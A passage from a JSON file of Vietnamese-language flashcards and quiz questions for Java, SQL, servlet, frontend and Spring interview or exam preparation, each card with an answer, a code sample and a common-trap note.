      "category": "Java Core: Ch1 Fundamentals",
      "tag": "Primitives",
      "question": "Trong Java, giá trị mặc định (default value) của biến cục bộ (local variable) là gì?",
      "answer": "KHÔNG CÓ giá trị mặc định! Biến cục bộ trong phương thức BẮT BUỘC phải được khởi tạo (initialize) trước khi sử dụng, nếu không trình biên dịch sẽ báo lỗi: `variable x might not have been initialized`.",
      "code": "public void test() {\n    int x;\n    // System.out.println(x); // COMPILE ERROR!\n    x = 10;\n    System.out.println(x); // OK: in ra 10\n}",
      "trap": "Chỉ có instance variable (thuộc tính của object) và static variable mới có giá trị mặc định (0, 0.0, false, null)."
    },
    {
      "id": "fc_j1_2",
      "category": "Java Core: Ch1 Fundamentals",
      "tag": "Primitives",
      "question": "Kiểu `byte` trong Java có kích thước bao nhiêu bit và khoảng giá trị (range) là bao nhiêu?",
      "answer": "Kích thước: 8-bit (1 byte), có dấu (signed 2's complement).\nKhoảng giá trị: từ -128 đến +127 (`-2^7` đến `2^7 - 1`).",
      "code": "byte b1 = 127; // OK\n// byte b2 = 128; // COMPILE ERROR: possible loss of precision\nbyte b3 = (byte) 128; // OK: ép kiểu -> b3 = -128 (tràn số)",
      "trap": "Giá trị 128 vượt quá giới hạn byte, nếu không ép kiểu tường minh sẽ bị Compile Error."
    },
    {
      "id": "fc_j1_3",
      "category": "Java Core: Ch1 Fundamentals",
      "tag": "Arrays",
      "question": "Khai báo mảng `int[] arr = new int[5];` thì các phần tử bên trong có giá trị mặc định là gì?",
      "answer": "Dù mảng được tạo bên trong phương thức (local), các phần tử của mảng luôn được cấp phát trên Heap và tự động nhận giá trị mặc định của kiểu dữ liệu phần tử đó (đối với `int` là `0`, đối với boolean là `false`, đối với Object là `null`).",
      "code": "int[] arr = new int[3];\nSystem.out.println(arr[0]); // In ra 0 (Hợp lệ, không lỗi compile)",
      "trap": "Bản thân biến tham chiếu `arr` nếu là local thì phải gán mới dùng được, nhưng các phần tử `arr[i]` bên trong mảng luôn có default value."
    },
    {
      "id": "fc_j1_4",
      "category": "Java Core: Ch1 Fundamentals",
      "tag": "Main Method",
      "question": "Chữ ký hợp lệ của phương thức `main` để JVM có thể khởi chạy chương trình là gì?",
      "answer": "Bắt buộc: `public static void main(String[] args)` (hoặc `String... args` từ Java 5).\nThứ tự `public static` hoặc `static public` đều hợp lệ. Tên mảng tham số có thể đặt tùy ý.",
      "code": "static public void main(String... arguments) { // Hoàn toàn hợp lệ! }\n// private static void main(...) // Biên dịch được nhưng JVM không chạy được",
      "trap": "Nếu thiếu `public` hoặc `static` hoặc kiểu trả về khác `void`, mã vẫn biên dịch bình thường nhưng khi chạy bằng lệnh `java` sẽ báo lỗi `Main method not found`."
    },
    {
      "id": "fc_j2_1",
      "category": "Java Core: Ch2 Declarations",
      "tag": "Access Modifiers",
      "question": "Modifier `protected` cho phép truy cập từ những phạm vi nào?",
      "answer": "1. Trong cùng class.\n2. Bất kỳ class nào trong CÙNG PACKAGE (giống default).\n3. Các SUBCLASS (class con) ở KHÁC PACKAGE, NHƯNG chỉ truy cập được thông qua tính kế thừa (inheritance - qua tham chiếu của chính class con đó hoặc `super`), KHÔNG thể truy cập qua tham chiếu của class cha.",
      "code": "// Package p1\npublic class Parent { protected int x = 10; }\n// Package p2\npublic class Child extends Parent {\n    void test() {\n        System.out.println(this.x); // OK via inheritance\n        Parent p = new Parent();\n        // System.out.println(p.x); // COMPILE ERROR!\n    }\n}",
      "trap": "Bẫy kinh điển: Class con ở khác package truy cập `protected` thông qua `parentRef.x` sẽ bị lỗi biên dịch!"
    },
    {
      "id": "fc_j2_2",
      "category": "Java Core: Ch2 Declarations",
      "tag": "Interface",
      "question": "Các biến (variables) và phương thức (methods) khai báo trong Interface có modifier ngầm định là gì?",
      "answer": "- Biến: LUÔN LUÔN ngầm định là `public static final` (hằng số). Không thể khai báo `private`, `protected`, hay thay đổi giá trị.\n- Phương thức (trước Java 8): LUÔN LUÔN ngầm định là `public abstract`.",
      "code": "interface Printable {\n    int MAX = 100; // Ngầm định là: public static final int MAX = 100;\n    void print();  // Ngầm định là: public abstract void print();\n}",
      "trap": "Class implement interface khi override phương thức BẮT BUỘC phải ghi rõ modifier `public`. Nếu quên `public` (để default), compiler sẽ báo lỗi: `attempting to assign weaker access privileges; was public`."
    },
    {
      "id": "fc_j2_3",
      "category": "Java Core: Ch2 Declarations",
      "tag": "Class Rules",
      "question": "Trong một file mã nguồn Java (.java), có thể có bao nhiêu `public class`?",
      "answer": "Chỉ được phép có TỐI ĐA 1 `public class`, và tên file bắt buộc phải trùng khớp chính xác với tên của `public class` đó. Tuy nhiên, có thể có vô số các non-public (default) class trong cùng file.",
      "code": "// File: Test.java\npublic class Test {} // Bắt buộc trùng tên file\nclass Helper1 {}     // Hợp lệ\nclass Helper2 {}     // Hợp lệ\n// public class Extra {} // COMPILE ERROR: class Extra is public, should be declared in Extra.java",
      "trap": "Nếu file không có public class nào thì tên file có thể đặt tùy ý."
    },
    {
      "id": "fc_j3_1",
      "category": "Java Core: Ch3 Operators",
      "tag": "Short-Circuit",
      "question": "Toán tử short-circuit `&&` khác gì toán tử bitwise/logical `&`?",
      "answer": "- `&&` (Short-circuit): Nếu vế trái đánh giá ra `false`, JVM sẽ BỎ QUA không thực thi vế phải (vì kết quả chắc chắn là `false`).\n- `&` (Non-short-circuit): BẮT BUỘC tính toán cả hai vế bất kể vế trái là gì.",
      "code": "int x = 5;\nif (false && ++x > 5) {} \nSystem.out.println(x); // In ra 5 (vế phải không chạy)\n\nif (false & ++x > 5) {}\nSystem.out.println(x); // In ra 6 (vế phải VẪN CHẠY!)",
      "trap": "Rất hay bị TestKing gài biểu thức tăng giảm (`++x`, `x--`) nằm ở vế phải của toán tử `&&` hoặc `||`."
    },
    {
      "id": "fc_j3_2",
      "category": "Java Core: Ch3 Operators",
      "tag": "Increment",
      "question": "Kết quả in ra của đoạn mã sau là gì?\n`int x = 1; x = x++; System.out.println(x);`",
      "answer": "Kết quả in ra là `1`!\nGiải thích: Postfix `x++` lưu giá trị cũ của `x` (là 1) vào bộ đệm tạm thời, sau đó tăng `x` lên 2, nhưng cuối cùng phép gán `=` lại gán giá trị từ bộ đệm (1) đè lại vào `x`.",
      "code": "int x = 1;\nx = x++;\nSystem.out.println(x); // In ra 1!",
      "trap": "Đừng nhầm tưởng x sẽ bằng 2. Phép gán `=` sẽ ghi đè kết quả của phép tăng postfix."
    },
    {
      "id": "fc_j3_3",
      "category": "Java Core: Ch3 Operators",
      "tag": "Casting & Promotion",
      "question": "Biểu thức sau có biên dịch được không?\n`byte b1 = 10; byte b2 = 20; byte b3 = b1 + b2;`",
      "answer": "COMPILE ERROR!\nGiải thích: Trong Java, mọi phép toán số học (+, -, *, /) với kiểu nhỏ hơn `int` (như byte, short, char) đều tự động được nâng kiểu (numeric promotion) lên kiểu `int`. Kết quả của `b1 + b2` là kiểu `int`, gán lại cho `byte` sẽ gây lỗi mất mát độ chính xác.",
      "code": "byte b1 = 10, b2 = 20;\n// byte b3 = b1 + b2; // COMPILE ERROR: Type mismatch: cannot convert from int to byte\nbyte b3 = (byte)(b1 + b2); // OK: phải ép kiểu tường minh",
      "trap": "Toán tử gán kết hợp (`b1 += b2`) lại tự động ép kiểu ngầm định `b1 = (byte)(b1 + b2)` nên biên dịch được!"
    },
    {
      "id": "fc_j4_1",
      "category": "Java Core: Ch4 Flow & Exceptions",
      "tag": "Exceptions",
      "question": "Khối `finally` có LUÔN LUÔN được thực thi không? Khi nào `finally` KHÔNG chạy?",
      "answer": "Khối `finally` hầu như luôn luôn chạy (kể cả khi trong `try` hoặc `catch` có lệnh `return`).\n`finally` CHỈ KHÔNG chạy khi:\n1. Gọi `System.exit(0);` để tắt JVM.\n2. JVM bị crash (Fatal Error, OutOfMemoryError không thể phục hồi, mất điện phần cứng).",
      "code": "public static int test() {\n    try {\n        return 1;\n    } finally {\n        return 2;\n    }\n}\n// test() sẽ trả về 2! Return trong finally ghi đè return trong try!",
      "trap": "Bẫy return trong finally: nếu finally có return, nó sẽ nuốt luôn exception hoặc giá trị return ở try!"
    },
    {
      "id": "fc_j4_2",
      "category": "Java Core: Ch4 Flow & Exceptions",
      "tag": "Switch",
      "question": "Trong Java trước Java 7, câu lệnh `switch` hỗ trợ những kiểu dữ liệu nào?",
      "answer": "Chỉ hỗ trợ kiểu nguyên tương thích với `int`:\n1. `byte` (và Byte wrapper)\n2. `short` (và Short wrapper)\n3. `char` (và Character wrapper)\n4. `int` (và Integer wrapper)\n5. `enum` (từ Java 5)\n*Từ Java 7 bổ sung `String`. Tuyệt đối KHÔNG hỗ trợ: `long`, `float`, `double`, `boolean`.",
      "code": "long num = 10L;\n// switch (num) {} // COMPILE ERROR: Cannot switch on a value of type long.",
      "trap": "TestKing rất hay cho biến kiểu `long`, `float` hoặc `boolean` vào biểu thức `switch` để gài thí sinh."
    },
    {
      "id": "fc_j5_1",
      "category": "Java Core: Ch5 OOP",
      "tag": "Overriding vs Overloading",
      "question": "Nêu 4 quy tắc bắt buộc khi Override một phương thức trong Java?",
      "answer": "1. Tên phương thức và danh sách tham số (Method Signature) phải GIỐNG HỆT.\n2. Kiểu trả về phải GIỐNG HỆT hoặc là kiểu con (Covariant Return Type từ Java 5).\n3. Access modifier KHÔNG ĐƯỢC HẸP HƠN phương thức ở class cha (ví dụ cha là `protected` thì con chỉ có thể là `protected` hoặc `public`).\n4. KHÔNG ĐƯỢC ném (throw) Checked Exception mới hoặc rộng hơn so với phương thức cha.",
      "code": "class Parent {\n    protected Number getVal() throws IOException { return 1; }\n}\nclass Child extends Parent {\n    public Integer getVal() { return 2; } // Hoàn toàn hợp lệ! (public rộng hơn, Integer là con Number, không ném exception)\n}",
      "trap": "Nếu phương thức con ném thêm `Exception` (rộng hơn `IOException`), compiler sẽ báo lỗi ngay lập tức."
    },
    {
      "id": "fc_j5_2",
      "category": "Java Core: Ch5 OOP",
      "tag": "Polymorphism",
      "question": "Tính đa hình (Polymorphism) áp dụng cho biến thuộc tính (fields) hay phương thức (methods)?",
      "answer": "CHỈ ÁP DỤNG CHO INSTANCE METHODS!\nThuộc tính (fields/variables) và static methods KHÔNG CÓ tính đa hình (bị ẩn - hidden, chứ không override). Biến nào được truy cập sẽ phụ thuộc hoàn toàn vào KIỂU CỦA THAM CHIẾU lúc biên dịch (Reference Type), chứ không phụ thuộc vào đối tượng thực tế lúc chạy.",
      "code": "class Parent { int x = 10; }\nclass Child extends Parent { int x = 20; }\n\nParent p = new Child();\nSystem.out.println(p.x); // In ra 10! (Theo kiểu tham chiếu Parent, KHÔNG đa hình)",
      "trap": "Bẫy cực kỳ phổ biến trong TestKing: `Parent p = new Child(); System.out.println(p.x);` luôn lấy biến của Parent."
    },
    {
      "id": "fc_j5_3",
      "category": "Java Core: Ch5 OOP",
      "tag": "Constructors",
      "question": "Khi nào trình biên dịch (Compiler) tự động tạo Default Constructor (constructor không tham số) cho một class?",
      "answer": "CHỈ KHI lập trình viên KHÔNG TỰ VIẾT BẤT KỲ CONSTRUCTOR NÀO trong class!\nNếu đã viết bất kỳ constructor nào (kể cả có tham số), compiler sẽ KHÔNG tự tạo constructor rỗng nữa.",
      "code": "class Parent {\n    Parent(int x) {} // Có constructor có tham số\n}\n// class Child extends Parent {} // COMPILE ERROR!\n// Lỗi: Implicit super constructor Parent() is undefined for default constructor.",
      "trap": "Class con nếu không viết constructor thì constructor ngầm định của nó sẽ tự gọi `super()`. Nếu class cha không có constructor không tham số thì sẽ lỗi biên dịch."
    },
    {
      "id": "fc_j6_1",
      "category": "Java Core: Ch6 String & Wrapper",
      "tag": "String Pool",
      "question": "Đoạn mã sau tạo ra bao nhiêu đối tượng trên bộ nhớ?\n`String s = new String(\"Hello\");`",
      "answer": "Tạo ra 1 hoặc 2 đối tượng:\n1. Literal `\"Hello\"` được tạo và lưu trong String Constant Pool (nếu trước đó pool chưa có chuỗi này).\n2. Từ khóa `new` luôn luôn tạo ra một đối tượng String mới tinh nằm trên Heap độc lập.\n(Nếu chuỗi \"Hello\" đã có sẵn trong String Pool thì chỉ tạo 1 object mới trên Heap).",
      "code": "String s1 = \"Hello\"; // Tạo 1 object trong Pool\nString s2 = new String(\"Hello\"); // Tạo 1 object mới trên Heap\nSystem.out.println(s1 == s2);      // false (khác địa chỉ)\nSystem.out.println(s1.equals(s2)); // true (cùng nội dung)",
      "trap": "Toán tử `==` so sánh địa chỉ tham chiếu bộ nhớ. Phương thức `equals()` của String so sánh nội dung các ký tự."
    },
    {
      "id": "fc_j6_2",
      "category": "Java Core: Ch6 String & Wrapper",
      "tag": "Integer Cache",
      "question": "Kết quả của đoạn code sau là gì?\n`Integer a = 100, b = 100; System.out.println(a == b);`\n`Integer c = 200, d = 200; System.out.println(c == d);`",
      "answer": "In ra: `true` sau đó `false`!\nGiải thích: Java có cơ chế **Integer Cache** tự động lưu sẵn các đối tượng Integer có giá trị từ **-128 đến 127** khi autoboxing. Với 100, cả `a` và `b` đều trỏ vào cùng 1 object trong cache -> `a == b` là `true`. Với 200 (vượt quá 127), Java tạo 2 object mới riêng biệt trên Heap -> `c == d` là `false`.",
      "code": "Integer a = 127, b = 127;\nSystem.out.println(a == b); // true\nInteger c = 128, d = 128;\nSystem.out.println(c == d); // false\nSystem.out.println(c.equals(d)); // true (luôn so sánh bằng equals)",
      "trap": "Bẫy autoboxing so sánh `==` giữa các Wrapper object. Luôn dùng `.equals()` khi so sánh đối tượng."
    },
    {
      "id": "fc_j7_1",
      "category": "Java Core: Ch7 Collections",
      "tag": "List vs Set vs Map",
      "question": "Phân biệt List, Set, Map về: Cho phép trùng lặp (Duplicate) và Thứ tự (Ordering)?",
      "answer": "- **List**: Cho phép trùng lặp (Duplicate: YES). Có thứ tự theo chỉ số chèn (Ordered by index: YES).\n- **Set**: KHÔNG cho phép trùng lặp (Duplicate: NO). HashSet không bảo toàn thứ tự, TreeSet sắp xếp theo giá trị, LinkedHashSet theo thứ tự chèn.\n- **Map**: Lưu theo Key-Value. Key KHÔNG được trùng lặp, Value được trùng lặp. Map KHÔNG kế thừa từ `Collection` interface.",
      "code": "List<String> list = new ArrayList<>(); // Cho phép lặp\nSet<String> set = new HashSet<>();     // Loại bỏ phần tử trùng lặp\nMap<String, Integer> map = new HashMap<>(); // Key duy nhất",
      "trap": "Map KHÔNG nằm trong Collection hierarchy (Map không implement Collection, không có phương thức add/iterator trực tiếp)."
    },
    {
      "id": "fc_j7_2",
      "category": "Java Core: Ch7 Collections",
      "tag": "equals & hashCode",
      "question": "Hợp đồng (Contract) giữa phương thức `equals()` và `hashCode()` quy định điều gì?",
      "answer": "1. Nếu hai object `o1.equals(o2) == true` thì BẮT BUỘC `o1.hashCode() == o2.hashCode()`.\n2. Nếu hai object có `hashCode()` bằng nhau thì CHƯA CHẮC `equals()` đã bằng nhau (đây gọi là Hash Collision / Đụng độ hash).\n3. Nếu bạn override `equals()`, bạn BẮT BUỘC phải override `hashCode()`. Nếu không, HashMap/HashSet sẽ không tìm thấy object dù chúng bằng nhau theo equals.",
      "code": "// Nếu quên override hashCode():\nPerson p1 = new Person(\"Nam\", 20);\nmap.put(p1, \"Developer\");\nPerson p2 = new Person(\"Nam\", 20); // equals == true nhưng hashCode khác nhau\nmap.get(p2); // Sẽ trả về null!",
      "trap": "Rất nhiều câu hỏi phỏng vấn Audit và TestKing hỏi: Quên override hashCode() khi dùng HashMap làm Key thì hậu quả là gì?"
    },
    {
      "id": "fc_j8_1",
      "category": "Java Core: Ch8 Inner Classes",
      "tag": "Method-Local Inner Class",
      "question": "Một Method-Local Inner Class có thể truy cập những biến nào của phương thức chứa nó?",
      "answer": "Chỉ có thể truy cập các biến cục bộ (local variables) được khai báo là `final` (hoặc effectively final từ Java 8 - biến không bị gán lại giá trị sau khi khởi tạo).\nLý do: Vòng đời của object Inner Class trên Heap có thể sống lâu hơn thời gian thực thi của phương thức trên Stack.",
      "code": "void doSomething() {\n    int count = 10; // effectively final\n    class Inner {\n        void show() { System.out.println(count); }\n    }\n    // count = 20; // Nếu bỏ comment dòng này -> Inner class báo COMPILE ERROR ngay!\n}",
      "trap": "Nếu biến bị thay đổi giá trị ở bất kỳ đâu trong method, nó mất tính effectively final và inner class không thể truy cập được nữa."
    },
    {
      "id": "fc_j9_1",
      "category": "Java Core: Ch9 Threads",
      "tag": "Thread Execution",
      "question": "Sự khác biệt giữa việc gọi `t.start()` và `t.run()` trên một Thread object là gì?",
      "answer": "- `t.start()`: Khởi tạo một luồng thực thi (thread of execution) MỚI từ hệ điều hành, cấp phát Stack riêng, và sau đó JVM sẽ gọi phương thức `run()` trên luồng mới đó bất đồng bộ.\n- `t.run()`: Chỉ là một lời gọi phương thức thông thường, chạy đồng bộ tuần tự trên CHÍNH LUỒNG HIỆN TẠI (thường là main thread), hoàn toàn KHÔNG tạo luồng mới!",
      "code": "Thread t = new Thread(() -> System.out.println(Thread.currentThread().getName()));\nt.run();   // In ra: main\nt.start(); // In ra: Thread-0 (luồng mới)",
      "trap": "Nếu gọi `run()` trực tiếp thì chương trình vẫn chạy nhưng không hề có tính đa luồng (multithreading)."
    },
    {
      "id": "fc_j9_2",
      "category": "Java Core: Ch9 Threads",
      "tag": "Synchronization",
      "question": "Các phương thức `wait()`, `notify()`, `notifyAll()` thuộc class nào và phải được gọi ở đâu?",
      "answer": "Các phương thức này thuộc class `Object` (chứ không phải `Thread`), vì chúng thao tác trên Lock/Monitor của từng đối tượng.\nBẮT BUỘC: Phải được gọi bên trong một khối đồng bộ `synchronized` đang giữ khóa của chính object đó. Nếu gọi bên ngoài khối synchronized, chương trình sẽ ném ngoại lệ `IllegalMonitorStateException` lúc runtime.",
      "code": "Object lock = new Object();\nsynchronized(lock) {\n    lock.wait(); // Hợp lệ\n    lock.notify(); // Hợp lệ\n}\n// lock.wait(); // RUNTIME ERROR: IllegalMonitorStateException",
      "trap": "Bẫy runtime exception kinh điển: Gọi wait() mà không có synchronized block."
    },
    {
      "id": "fc_sql_1",
      "category": "Database & SQL",
      "tag": "JOINs",
      "question": "Phân biệt INNER JOIN và LEFT JOIN trong SQL?",
      "answer": "- **INNER JOIN**: Chỉ trả về các bản ghi có sự khớp nối (match) điều kiện ở CẢ HAI BẢNG. Các bản ghi không khớp ở một trong hai bảng sẽ bị loại bỏ hoàn toàn.\n- **LEFT JOIN (LEFT OUTER JOIN)**: Trả về TOÀN BỘ các bản ghi của bảng bên TRÁI, cộng với các bản ghi khớp từ bảng bên phải. Nếu bảng bên phải không có dữ liệu khớp, các cột của bảng phải sẽ được điền giá trị `NULL`.",
      "code": "SELECT u.name, o.order_id\nFROM Users u\nLEFT JOIN Orders o ON u.id = o.user_id;\n-- Người dùng nào chưa mua hàng vẫn hiện tên, order_id là NULL",
      "trap": "Câu hỏi Audit 1-1 số 1 về SQL. Cần nêu rõ trường hợp bản ghi bên phải trả về NULL."
    },
    {
      "id": "fc_sql_2",
      "category": "Database & SQL",
      "tag": "GROUP BY & HAVING",
      "question": "Mệnh đề `WHERE` khác mệnh đề `HAVING` ở điểm cốt lõi nào?",
      "answer": "- `WHERE`: Lọc các dòng dữ liệu đơn lẻ TRƯỚC KHI gom nhóm (Grouping). `WHERE` KHÔNG ĐƯỢC chứa các hàm tổng hợp (Aggregate Functions như COUNT, SUM, AVG).\n- `HAVING`: Lọc các nhóm dữ liệu SAU KHI gom nhóm bởi `GROUP BY`. `HAVING` chuyên dùng với các hàm tổng hợp.",
      "code": "SELECT department_id, COUNT(*)\nFROM Employees\nWHERE salary > 1000       -- Lọc lương trước khi gom nhóm\nGROUP BY department_id\nHAVING COUNT(*) > 5;     -- Lọc nhóm có trên 5 người",
      "trap": "Viết `WHERE COUNT(*) > 5` sẽ bị lỗi cú pháp SQL ngay lập tức."
    },
    {
      "id": "fc_sql_3",
      "category": "Database & SQL",
      "tag": "DML",
      "question": "Phân biệt lệnh `DELETE` và `TRUNCATE` trong cơ sở dữ liệu?",
      "answer": "- **DELETE**: Lệnh DML (Data Manipulation Language). Xóa từng dòng một, có thể dùng mệnh đề `WHERE`. Ghi nhật ký (Transaction Log) chi tiết cho từng dòng -> Chậm hơn. CÓ THỂ ROLLBACK được.\n- **TRUNCATE**: Lệnh DDL (Data Definition Language). Xóa toàn bộ dữ liệu bằng cách giải phóng data pages, reset lại Auto-increment identity về 1. Không dùng được `WHERE`. Cực nhanh, thường không thể rollback (hoặc hạn chế).",
      "code": "DELETE FROM Employees WHERE dept_id = 1; -- Xóa có điều kiện\nTRUNCATE TABLE Logs; -- Xóa sạch bảng, reset id",
      "trap": "TRUNCATE không thể thực thi nếu bảng đang bị khóa ngoại (Foreign Key) tham chiếu tới."
    },
    {
      "id": "fc_web_1",
      "category": "JavaWeb: JSP & Servlet",
      "tag": "Servlet Lifecycle",
      "question": "Trình bày 3 giai đoạn trong vòng đời (Lifecycle) của một Servlet?",
      "answer": "1. **Khởi tạo (`init`)**: Được gọi DUY NHẤT 1 LẦN khi container nạp Servlet vào bộ nhớ (lần đầu có request hoặc khi server start nếu đặt `load-on-startup`).\n2. **Xử lý dịch vụ (`service`)**: Được gọi MỖI KHI có request đến. Servlet container tạo một thread mới và gọi `service(req, resp)`, sau đó điều phối sang `doGet()`, `doPost()`...\n3. **Hủy bỏ (`destroy`)**: Được gọi DUY NHẤT 1 LẦN khi container gỡ Servlet hoặc shutdown server để giải phóng tài nguyên.",
      "code": "public class MyServlet extends HttpServlet {\n    public void init() { /* Chạy 1 lần */ }\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) { /* Chạy mỗi request */ }\n    public void destroy() { /* Chạy 1 lần */ }\n}",
      "trap": "Servlet container chỉ tạo DUY NHẤT 1 instance (Singleton-like) của Servlet cho tất cả request, mỗi request là 1 thread riêng biệt -> Cần chú ý thread-safety với instance variables."
    },
    {
      "id": "fc_web_2",
      "category": "JavaWeb: JSP & Servlet",
      "tag": "Forward vs Redirect",
      "question": "Phân biệt `RequestDispatcher.forward()` và `HttpServletResponse.sendRedirect()`?",
      "answer": "- **Forward (Chuyển tiếp)**: Xảy ra hoàn toàn ở phía SERVER. URL trên trình duyệt KHÔNG THAY ĐỔI. Chỉ mất 1 vòng request-response. Đối tượng `request` và `response` được GIỮ NGUYÊN (dữ liệu `request.setAttribute` vẫn tồn tại).\n- **Redirect (Chuyển hướng)**: Server gửi mã trạng thái HTTP 302 về BROWSER, trình duyệt tự động gửi request MỚI đến URL mới. URL trên trình duyệt BỊ THAY ĐỔI. Mất 2 vòng request-response. Đối tượng `request` cũ bị hủy bỏ hoàn toàn.",
      "code": "// Forward:\nrequest.getRequestDispatcher(\"result.jsp\").forward(request, response);\n// Redirect:\nresponse.sendRedirect(\"home.jsp\");",
      "trap": "Câu hỏi số 1 trong vòng phỏng vấn Audit phần JavaWeb!"
    },
    {
      "id": "fc_fee_1",
      "category": "Frontend Essentials",
      "tag": "CSS",
      "question": "Trình bày các thành phần của CSS Box Model từ trong ra ngoài?",
      "answer": "Gồm 4 lớp đồng tâm:\n1. **Content**: Nội dung thực tế của phần tử (văn bản, hình ảnh).\n2. **Padding**: Khoảng đệm trong suốt bao quanh content, nằm giữa content và border (chịu ảnh hưởng bởi background-color).\n3. **Border**: Đường viền bao quanh padding và content.\n4. **Margin**: Khoảng cách bên ngoài, tạo khoảng trống giữa phần tử này với các phần tử xung quanh.",
      "code": "/* Thuộc tính box-sizing: border-box giúp tính toán width bao gồm cả padding và border */\n* {\n    box-sizing: border-box;\n}",
      "trap": "Nếu không dùng `box-sizing: border-box`, kích thước hiển thị thực tế = width + padding + border."
    },
    {
      "id": "fc_fee_2",
      "category": "Frontend Essentials",
      "tag": "CSS",
      "question": "Thuộc tính `display: none` khác gì `visibility: hidden`?",
      "answer": "- `display: none`: Ẩn phần tử HOÀN TOÀN khỏi cây hiển thị. Phần tử KHÔNG CHIẾM BẤT KỲ KHOẢNG TRỐNG NÀO trên trang web (các phần tử xung quanh sẽ lấp đầy chỗ của nó).\n- `visibility: hidden`: Ẩn phần tử nhưng VẪN GIỮ NGUYÊN KHOẢNG TRỐNG (vị trí, kích thước layout) của phần tử đó trên màn hình (để lại một khoảng trống trắng).",
      "code": ".hidden-item { display: none; }     /* Biến mất hoàn toàn, không tốn chỗ */\n.invisible-item { visibility: hidden; } /* Ẩn đi nhưng vẫn chiếm vị trí */",
      "trap": "Một trong những câu hỏi kiểm tra căn bản kinh điển nhất của phần FEE Audit."
    },
    {
      "id": "fc_fee_3",
      "category": "Frontend Essentials",
      "tag": "JavaScript",
      "question": "Phân biệt từ khóa `var`, `let` và `const` trong JavaScript ES6?",
      "answer": "- **var**: Function-scoped (hoặc global). Có hiện tượng Hoisting và được khởi tạo với `undefined`. Cho phép tái khai báo (re-declare) trong cùng scope.\n- **let**: Block-scoped `{}`. Có hoisting nhưng nằm trong Temporal Dead Zone (TDZ), truy cập trước khi gán sẽ bị ReferenceError. Không cho phép tái khai báo trong cùng block. Có thể gán lại giá trị.\n- **const**: Block-scoped. Bắt buộc phải khởi tạo giá trị khi khai báo. KHÔNG thể gán lại tham chiếu (re-assign).",
      "code": "if (true) {\n    var a = 1;\n    let b = 2;\n}\nconsole.log(a); // In ra 1 (var lọt ra ngoài)\n// console.log(b); // ReferenceError: b is not defined",
      "trap": "Với object được khai báo bằng `const obj = {}`, bạn vẫn có thể sửa thuộc tính `obj.name = 'test'` nhưng không thể gán `obj = {}` mới."
    },
    {
      "id": "fc_spring_1",
      "category": "Spring Framework",
      "tag": "IoC & DI",
      "question": "Inversion of Control (IoC) và Dependency Injection (DI) là gì?",
      "answer": "- **IoC (Đảo ngược quyền điều khiển)**: Một nguyên lý thiết kế phần mềm, trong đó quyền kiểm soát vòng đời và khởi tạo các đối tượng được chuyển giao từ lập trình viên cho một Framework / Container (Spring IoC Container) quản lý.\n- **DI (Tiêm phụ thuộc)**: Một mẫu hiện thực hóa cụ thể của IoC. Thay vì class tự khởi tạo các đối tượng phụ thuộc bằng từ khóa `new` (`new OrderDAO()`), các phụ thuộc sẽ được container tự động \"bơm/tiêm\" vào thông qua Constructor, Setter hoặc Field.",
      "code": "// Cách truyền thống (chặt chẽ, khó test):\nclass UserService { private UserDAO dao = new UserDAO(); }\n\n// Sử dụng Spring DI:\n@Service\nclass UserService {\n    private final UserDAO dao;\n    @Autowired\n    public UserService(UserDAO dao) { this.dao = dao; } // Constructor Injection\n}",
      "trap": "Luôn nhớ: IoC là nguyên lý (Principle), còn DI là phương thức thực thi (Design Pattern)."
    },
    {
      "id": "fc_spring_2",
      "category": "Spring Framework",
      "tag": "Annotations",
      "question": "Phân biệt `@Component`, `@Service`, `@Repository` và `@Controller`?",
      "answer": "Cả 4 đều là các Spring Stereotype Annotations đánh dấu class là một Spring Bean do Container quản lý.\n- `@Component`: Annotation gốc tổng quát nhất cho bất kỳ class Java nào.\n- `@Repository`: Đánh dấu lớp DAO / Persistence, có cơ chế tự động chuyển đổi các Exception cấp thấp của CSDL thành `DataAccessException` của Spring.\n- `@Service`: Đánh dấu lớp Business Logic nghiệp vụ.\n- `@Controller`: Đánh dấu lớp Web Controller điều phối view (Spring MVC).\n- `@RestController` = `@Controller` + `@ResponseBody` (trả về JSON/XML trực tiếp cho REST API).",
      "code": "@RestController // Trả về JSON\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    @Autowired private UserService userService;\n}",
      "trap": "Về mặt kỹ thuật, `@Service` hay `@Repository` đều là meta-annotated với `@Component`, nhưng dùng đúng thể hiện kiến trúc sạch và tận dụng các tính năng đặc thù."
    }
  ],
  "quizzes": [
    {
      "id": "q1",
      "chapter": "Chapter 1: Language Fundamentals",
      "type": "Java Core",
      "question": "Xem xét đoạn mã sau. Điều gì xảy ra khi biên dịch và chạy chương trình?",
      "code": "public class Test1 {\n    static int x;\n    public static void main(String[] args) {\n        int y;\n        if (x == 0) {\n            y = 1;\n        }\n        System.out.println(\"x = \" + x);\n        System.out.println(\"y = \" + y);\n    }\n}",
      "options": [
        "In ra:\nx = 0\ny = 1",
        "In ra:\nx = 0\ny = 0",
        "Lỗi biên dịch (Compile Error) tại dòng `System.out.println(\"y = \" + y);`",
        "Ném ngoại lệ NullPointerException lúc thực thi"
      ],
      "correctIndex": 2,
      "explanation": "Biến `x` là static variable nên được gán giá trị mặc định là 0. Tuy nhiên, biến `y` là local variable trong phương thức `main`. Trình biên dịch Java (javac) không thể chắc chắn điều kiện `x == 0` lúc runtime luôn luôn đúng tại thời điểm compile, do đó `y` bị coi là 'might not have been initialized'. Dòng in `y` sẽ gây lỗi biên dịch!",
      "trap": "Dù con người nhìn vào thấy x chắc chắn bằng 0, compiler chỉ phân tích luồng điều khiển tĩnh (definite assignment rule). Vì không có khối `else`, compiler không đảm bảo `y` luôn được gán."
    },
    {
      "id": "q2",
      "chapter": "Chapter 3: Operators & Assignments",
      "type": "Java Core",
      "question": "Kết quả in ra màn hình của đoạn mã sau là gì?",
      "code": "public class Test2 {\n    public static void main(String[] args) {\n        int a = 5;\n        int b = 10;\n        boolean result = (a++ > 5) && (++b > 10);\n        System.out.println(\"a = \" + a + \", b = \" + b + \", result = \" + result);\n    }\n}",
      "options": [
        "a = 6, b = 11, result = true",
        "a = 6, b = 10, result = false",
        "a = 5, b = 10, result = false",
        "a = 6, b = 11, result = false"
      ],
      "correctIndex": 1,
